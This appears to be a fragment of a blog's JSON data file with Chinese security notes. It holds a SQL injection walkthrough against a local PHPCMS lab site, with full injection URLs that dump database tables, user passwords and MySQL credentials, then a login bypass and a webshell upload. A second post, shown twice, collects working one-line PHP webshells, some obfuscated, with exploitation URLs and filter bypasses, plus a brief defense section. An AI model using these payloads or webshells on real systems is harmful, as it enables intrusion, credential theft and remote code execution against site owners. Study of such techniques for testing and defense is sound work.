title=\"注入页面\"></a>注入页面</h2><p><img src=\"/img/sql/phpcms/001.png\" alt=\"001\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>随便点击一个页面进行注入</p>\n<p>发现返回报错信息</p>\n<p><img src=\"/img/sql/phpcms/002.png\" alt=\"002\"></p>\n<h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>通过判断为数字型</p>\n<p><img src=\"/img/sql/phpcms/003.png\" alt=\"003\"></p>\n<h3 id=\"获取用户和当前数据库名\"><a href=\"#获取用户和当前数据库名\" class=\"headerlink\" title=\"获取用户和当前数据库名\"></a>获取用户和当前数据库名</h3><p><code>http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,concat(user(),0x7e,database()),0x7e))%23</code></p>\n<p><img src=\"/img/sql/phpcms/004.png\" alt=\"004\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;cms&#39; limit 1,1),0x7e))%23</code></p>\n<p>发现表名太多了,还是直接爆出比较犀利</p>\n<p><img src=\"/img/sql/phpcms/005.png\" alt=\"005\"></p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;cms&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/006.png\" alt=\"006\"></p>\n<p>直接爆出会遇上编码问题，需要concert()函数转码。</p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(table_name using latin1)) from information_schema.tables where table_schema=&#39;cms&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(column_name using latin1)) from information_schema.columns where table_schema=&#39;cms&#39; and table_name=&#39;cms_users&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/009.png\" alt=\"009\"></p>\n<h3 id=\"获取账户\"><a href=\"#获取账户\" class=\"headerlink\" title=\"获取账户\"></a>获取账户</h3><p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(userid,0x7e,username,0x7e,password) from cms.cms_users),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/010.png\" alt=\"010\"></p>\n<p>解密后密码为：</p>\n<p><img src=\"/img/sql/phpcms/011.png\" alt=\"011\"></p>\n<p>同理可获取mysql数据库的账户密码</p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(User,0x7e,Password) from mysql.user),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/phpcms/013.png\" alt=\"013\"></p>\n<h2 id=\"登录后台\"><a href=\"#登录后台\" class=\"headerlink\" title=\"登录后台\"></a>登录后台</h2><h3 id=\"登录界面存在SQL注入和万能密码\"><a href=\"#登录界面存在SQL注入和万能密码\" class=\"headerlink\" title=\"登录界面存在SQL注入和万能密码\"></a>登录界面存在SQL注入和万能密码</h3><p>登录界面存在万能密码，闭合方式为<code>&#39;&quot;&quot;&#39;</code>（5.4版本）</p>\n<p><img src=\"/img/sql/phpcms/014.png\" alt=\"014\"></p>\n<p>同样存在SQL注入</p>\n<p><img src=\"/img/sql/phpcms/016.png\" alt=\"017\"></p>\n<p><img src=\"/img/sql/phpcms/015.png\" alt=\"015\"></p>\n<h3 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h3><p>直接上传会出现文件限制</p>\n<p><img src=\"/img/sql/phpcms/017.png\" alt=\"017\"></p>\n<p>尝试多种方法后发现上传这条路不通。</p>\n<h3 id=\"数据库上传\"><a href=\"#数据库上传\" class=\"headerlink\" title=\"数据库上传\"></a>数据库上传</h3><p><img src=\"/img/sql/phpcms/018.png\" alt=\"018\"></p>\n<p><img src=\"/img/sql/phpcms/020.png\" alt=\"020\"></p>\n<p>上传一个phpinfo试试,成功访问</p>\n<p><img src=\"/img/sql/phpcms/021.png\" alt=\"021\"></p>\n<p>同理再传个一句话木马,用菜刀连接</p>\n<p><img src=\"/img/sql/phpcms/022.png\" alt=\"022\"></p>\n"},{"title":"php代码执行与命令执行","date":"2019-01-06T12:35:09.000Z","_content":"\n# php代码执行与命令执行\n\n## 代码执行\n\n### eval()  \n\n— 把字符串作为PHP代码执行\n\n```php\n#例:一句话木马\n<?php\n@eval($_GET[\"cmd\"]);\n?>\n```\n\n利用方式：\n\n```php\n1. shell.php?cmd=phpinfo();\n\n#文件上传条件竞争可利用此方式来创建文件\n2. shell.php?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')\n\n#绕过\n<?php\n$cmd = @(string)$_GET[\"cmd\"];\neval('$cmd=\"' . addslashes($cmd) . '\";');\n?>\n3. shell.php?cmd=${${phpinfo()}};\n\n#绕过\n<?php\n$cmd = \"echo \\\"hello \" . $_GET['cmd'] . \"\\\";\";\neval($cmd);?>\n4. ${${}}\nshell.php?cmd=${${phpinfo()}};\n```\n\n\n\n### assert()\n\n— bool assert ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] )\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。\n\n```php\n#例:一句话木马\n<?php\n@assert($_GET[\"cmd\"]);\n?>\n```\n\n### preg_replace + '/e'\n\npreg_replace — 执行一个正则表达式的搜索和替换\n\npreg_replace ( $pattern , $replacement , $subject )\n\npreg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。\n\n代码执行条件：\n\n1. magic_quotes_gpc=Off时，导致代码执行。\n\n2. pattern参数中注入/e选项\n\n```php\n<?php\n$regexp = $_GET['reg'];\n$var = '<php>phpinfo()</php>';\npreg_replace(\"/<php>(.*?)$regexp\", '\\\\1', $var);\n?>\n#利用方式 reg=%3C\\/php%3E/e 即reg=<\\/php>/e\n```\n\n利用方式：\n\n```php\n#当replacement 参数构成一个合理的php 代码字符串的时候\n#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行\n#例:一句话木马\n1.\n<?php\npreg_replace(\"//e\", $_GET['cmd'], \"cmd test\");\n?>\nshell.php?cmd=phpinfo();\n\n2.\n<?\npreg_replace(\"/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies\", \"\\\\1\", $_GET['h']);\n?>\nh=[php]phpinfo()[/php]\n```\n![001](/img/php/php_fun_CodeAndOrder/001.png)\n\nphp5.5以后用'''preg_replace_callback'''代替'''preg_replace'''的/e模式来处理正则执行替换\n\n### array_map\n\narray_map — 为数组的每个元素应用回调函数\n\n```php\n#例:一句话木马\n<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['test']);?>\n1.shell.php?test=phpinfo()\n```\n\n### call_user_func\n\ncall_user_func ( [callable](http://php.net/manual/zh/language.types.callable.php) `$callback` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$parameter` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$...` ]] )\n\ncall_user_func — 把第一个参数作为回调函数调用\n\n第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。\n\n```php\n#例:一句话木马\n<?php call_user_func('assert', $_REQUEST['pass']);?>\n    \n1.shell.php?pass=phpinfo();\n```\n\n### call_user_func_array\n\ncall_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数\n\n把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。\n\n```php\n#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组\n#例:一句话木马\n<?php call_user_func_array('assert', array($_REQUEST['pass']));?>\n    \n1.shell.php?pass=phpinfo();\n```\n\n### create_function\n\ncreate_function - 创建一个匿名（lambda样式）函数\n\n```php\n#例:一句话木马\n<?php preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);?>\n\n1.shell.php?pass=phpinfo();\n```\n\nphp中其他包含回调函数参数的函数也有潜力\n\n## 命令执行\n\n### system\n\nstring system ( string `$command` [, int `&$return_var` ] )\n\n$command:要执行的命令。\n\n### exec\n\nstring exec ( string `$command` [, array `&$output` [, int `&$return_var` ]] )\n\n**exec()** 执行 `command` 参数所指定的命令。\n\n### shell_exec\n\nshell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。\n\n### passthru\n\n直接将结果输出到游览器,不返回任何值\n\n### popen\n\nresource popen ( string `$command` , string `$mode` )\n\n打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。\n\n### proc_open\n\n类似 [popen()](http://php.net/manual/zh/function.popen.php) 函数.但提供了更加强大的控制程序执行的能力。\n\n## 防御\n\n1. 尽量不要执行外部命令\n\n2. 使用自定义函数或函数库来替代外部命令的功能\n\n3. 使用escapeshellarg函数来处理命令参数\n\n4. 使用safe_mode_exec_dir指定可执行文件的路径\n\nesacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\\’”，双引号“\"”，替换成“\\\"”，分号“;”替换成“\\;”\n\n用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内\n\nsafe_mode = On\n\nsafe_mode_exec_dir = /usr/local/php/bin/","source":"_posts/php代码执行与命令执行.md","raw":"---\ntitle: php代码执行与命令执行\ndate: 2019-01-06 20:35:09\ntags: [php]\ncategories:\n  - [php]\n  - [整理]\n---\n\n# php代码执行与命令执行\n\n## 代码执行\n\n### eval()  \n\n— 把字符串作为PHP代码执行\n\n```php\n#例:一句话木马\n<?php\n@eval($_GET[\"cmd\"]);\n?>\n```\n\n利用方式：\n\n```php\n1. shell.php?cmd=phpinfo();\n\n#文件上传条件竞争可利用此方式来创建文件\n2. shell.php?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')\n\n#绕过\n<?php\n$cmd = @(string)$_GET[\"cmd\"];\neval('$cmd=\"' . addslashes($cmd) . '\";');\n?>\n3. shell.php?cmd=${${phpinfo()}};\n\n#绕过\n<?php\n$cmd = \"echo \\\"hello \" . $_GET['cmd'] . \"\\\";\";\neval($cmd);?>\n4. ${${}}\nshell.php?cmd=${${phpinfo()}};\n```\n\n\n\n### assert()\n\n— bool assert ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] )\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。\n\n```php\n#例:一句话木马\n<?php\n@assert($_GET[\"cmd\"]);\n?>\n```\n\n### preg_replace + '/e'\n\npreg_replace — 执行一个正则表达式的搜索和替换\n\npreg_replace ( $pattern , $replacement , $subject )\n\npreg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。\n\n代码执行条件：\n\n1. magic_quotes_gpc=Off时，导致代码执行。\n\n2. pattern参数中注入/e选项\n\n```php\n<?php\n$regexp = $_GET['reg'];\n$var = '<php>phpinfo()</php>';\npreg_replace(\"/<php>(.*?)$regexp\", '\\\\1', $var);\n?>\n#利用方式 reg=%3C\\/php%3E/e 即reg=<\\/php>/e\n```\n\n利用方式：\n\n```php\n#当replacement 参数构成一个合理的php 代码字符串的时候\n#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行\n#例:一句话木马\n1.\n<?php\npreg_replace(\"//e\", $_GET['cmd'], \"cmd test\");\n?>\nshell.php?cmd=phpinfo();\n\n2.\n<?\npreg_replace(\"/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies\", \"\\\\1\", $_GET['h']);\n?>\nh=[php]phpinfo()[/php]\n```\n![001](/img/php/php_fun_CodeAndOrder/001.png)\n\nphp5.5以后用'''preg_replace_callback'''代替'''preg_replace'''的/e模式来处理正则执行替换\n\n### array_map\n\narray_map — 为数组的每个元素应用回调函数\n\n```php\n#例:一句话木马\n<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['test']);?>\n1.shell.php?test=phpinfo()\n```\n\n### call_user_func\n\ncall_user_func ( [callable](http://php.net/manual/zh/language.types.callable.php) `$callback` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$parameter` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$...` ]] )\n\ncall_user_func — 把第一个参数作为回调函数调用\n\n第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。\n\n```php\n#例:一句话木马\n<?php call_user_func('assert', $_REQUEST['pass']);?>\n    \n1.shell.php?pass=phpinfo();\n```\n\n### call_user_func_array\n\ncall_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数\n\n把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。\n\n```php\n#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组\n#例:一句话木马\n<?php call_user_func_array('assert', array($_REQUEST['pass']));?>\n    \n1.shell.php?pass=phpinfo();\n```\n\n### create_function\n\ncreate_function - 创建一个匿名（lambda样式）函数\n\n```php\n#例:一句话木马\n<?php preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);?>\n\n1.shell.php?pass=phpinfo();\n```\n\nphp中其他包含回调函数参数的函数也有潜力\n\n## 命令执行\n\n### system\n\nstring system ( string `$command` [, int `&$return_var` ] )\n\n$command:要执行的命令。\n\n### exec\n\nstring exec ( string `$command` [, array `&$output` [, int `&$return_var` ]] )\n\n**exec()** 执行 `command` 参数所指定的命令。\n\n### shell_exec\n\nshell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。\n\n### passthru\n\n直接将结果输出到游览器,不返回任何值\n\n### popen\n\nresource popen ( string `$command` , string `$mode` )\n\n打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。\n\n### proc_open\n\n类似 [popen()](http://php.net/manual/zh/function.popen.php) 函数.但提供了更加强大的控制程序执行的能力。\n\n## 防御\n\n1. 尽量不要执行外部命令\n\n2. 使用自定义函数或函数库来替代外部命令的功能\n\n3. 使用escapeshellarg函数来处理命令参数\n\n4. 使用safe_mode_exec_dir指定可执行文件的路径\n\nesacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\\’”，双引号“\"”，替换成“\\\"”，分号“;”替换成“\\;”\n\n用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内\n\nsafe_mode = On\n\nsafe_mode_exec_dir = /usr/local/php/bin/","slug":"php代码执行与命令执行","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcb001b4dsbgv07qxwi","content":"<h1 id=\"php代码执行与命令执行\"><a href=\"#php代码执行与命令执行\" class=\"headerlink\" title=\"php代码执行与命令执行\"></a>php代码执行与命令执行</h1><h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><h3 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval()\"></a>eval()</h3><p>— 把字符串作为PHP代码执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>利用方式：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> shell.php?cmd=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#文件上传条件竞争可利用此方式来创建文件</span></span><br><span class=\"line\"><span class=\"number\">2.</span> shell.php?cmd=fputs(fopen(<span class=\"string\">'test.php'</span>,<span class=\"string\">'w'</span>),<span class=\"string\">'&lt;?php @eval($_POST[test])?&gt;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#绕过</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = @(string)$_GET[<span class=\"string\">\"cmd\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">'$cmd=\"'</span> . addslashes($cmd) . <span class=\"string\">'\";'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">3.</span> shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#绕过</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = <span class=\"string\">\"echo \\\"hello \"</span> . $_GET[<span class=\"string\">'cmd'</span>] . <span class=\"string\">\"\\\";\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>($cmd);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">4.</span> $&#123;$&#123;&#125;&#125;</span><br><span class=\"line\">shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"assert\"><a href=\"#assert\" class=\"headerlink\" title=\"assert()\"></a>assert()</h3><p>— bool assert ( <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] )</p>\n<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@assert($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"preg-replace-‘-e’\"><a href=\"#preg-replace-‘-e’\" class=\"headerlink\" title=\"preg_replace + ‘/e’\"></a>preg_replace + ‘/e’</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>\n<p>preg_replace ( $pattern , $replacement , $subject )</p>\n<p>preg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。</p>\n<p>代码执行条件：</p>\n<ol>\n<li><p>magic_quotes_gpc=Off时，导致代码执行。</p>\n</li>\n<li><p>pattern参数中注入/e选项</p>\n</li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$regexp = $_GET[<span class=\"string\">'reg'</span>];</span><br><span class=\"line\">$var = <span class=\"string\">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/&lt;php&gt;(.*?)$regexp\"</span>, <span class=\"string\">'\\\\1'</span>, $var);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#利用方式 reg=%3C\\/php%3E/e 即reg=&lt;\\/php&gt;/e</span></span><br></pre></td></tr></table></figure>\n\n<p>利用方式：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#当replacement 参数构成一个合理的php 代码字符串的时候</span></span><br><span class=\"line\"><span class=\"comment\">#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行</span></span><br><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"number\">1.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"//e\"</span>, $_GET[<span class=\"string\">'cmd'</span>], <span class=\"string\">\"cmd test\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">shell.php?cmd=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies\"</span>, <span class=\"string\">\"\\\\1\"</span>, $_GET[<span class=\"string\">'h'</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">h=[php]phpinfo()[/php]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/php/php_fun_CodeAndOrder/001.png\" alt=\"001\"></p>\n<p>php5.5以后用’’’preg_replace_callback’’’代替’’’preg_replace’’’的/e模式来处理正则执行替换</p>\n<h3 id=\"array-map\"><a href=\"#array-map\" class=\"headerlink\" title=\"array_map\"></a>array_map</h3><p>array_map — 为数组的每个元素应用回调函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> array_map(<span class=\"string\">\"ass\\x65rt\"</span>,(<span class=\"keyword\">array</span>)$_REQUEST[<span class=\"string\">'test'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?test=phpinfo()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call-user-func\"><a href=\"#call-user-func\" class=\"headerlink\" title=\"call_user_func\"></a>call_user_func</h3><p>call_user_func ( <a href=\"http://php.net/manual/zh/language.types.callable.php\" target=\"_blank\" rel=\"noopener\">callable</a> <code>$callback</code> [, <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$parameter</code> [, <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$...</code> ]] )</p>\n<p>call_user_func — 把第一个参数作为回调函数调用</p>\n<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> call_user_func(<span class=\"string\">'assert'</span>, $_REQUEST[<span class=\"string\">'pass'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call-user-func-array\"><a href=\"#call-user-func-array\" class=\"headerlink\" title=\"call_user_func_array\"></a>call_user_func_array</h3><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>\n<p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组</span></span><br><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> call_user_func_array(<span class=\"string\">'assert'</span>, <span class=\"keyword\">array</span>($_REQUEST[<span class=\"string\">'pass'</span>]));<span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function - 创建一个匿名（lambda样式）函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> preg_replace_callback(<span class=\"string\">'/.+/i'</span>, create_function(<span class=\"string\">'$arr'</span>, <span class=\"string\">'return assert($arr[0]);'</span>),$_REQUEST[<span class=\"string\">'pass'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<p>php中其他包含回调函数参数的函数也有潜力</p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><h3 id=\"system\"><a href=\"#system\" class=\"headerlink\" title=\"system\"></a>system</h3><p>string system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>\n<p>$command:要执行的命令。</p>\n<h3 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h3><p>string exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>\n<p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>\n<h3 id=\"shell-exec\"><a href=\"#shell-exec\" class=\"headerlink\" title=\"shell_exec\"></a>shell_exec</h3><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>\n<h3 id=\"passthru\"><a href=\"#passthru\" class=\"headerlink\" title=\"passthru\"></a>passthru</h3><p>直接将结果输出到游览器,不返回任何值</p>\n<h3 id=\"popen\"><a href=\"#popen\" class=\"headerlink\" title=\"popen\"></a>popen</h3><p>resource popen ( string <code>$command</code> , string <code>$mode</code> )</p>\n<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>\n<h3 id=\"proc-open\"><a href=\"#proc-open\" class=\"headerlink\" title=\"proc_open\"></a>proc_open</h3><p>类似 <a href=\"http://php.net/manual/zh/function.popen.php\" target=\"_blank\" rel=\"noopener\">popen()</a> 函数.但提供了更加强大的控制程序执行的能力。</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><ol>\n<li><p>尽量不要执行外部命令</p>\n</li>\n<li><p>使用自定义函数或函数库来替代外部命令的功能</p>\n</li>\n<li><p>使用escapeshellarg函数来处理命令参数</p>\n</li>\n<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>\n</li>\n</ol>\n<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\\’”，双引号“””，替换成“&quot;”，分号“;”替换成“;”</p>\n<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内</p>\n<p>safe_mode = On</p>\n<p>safe_mode_exec_dir = /usr/local/php/bin/</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"php代码执行与命令执行\"><a href=\"#php代码执行与命令执行\" class=\"headerlink\" title=\"php代码执行与命令执行\"></a>php代码执行与命令执行</h1><h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><h3 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval()\"></a>eval()</h3><p>— 把字符串作为PHP代码执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span 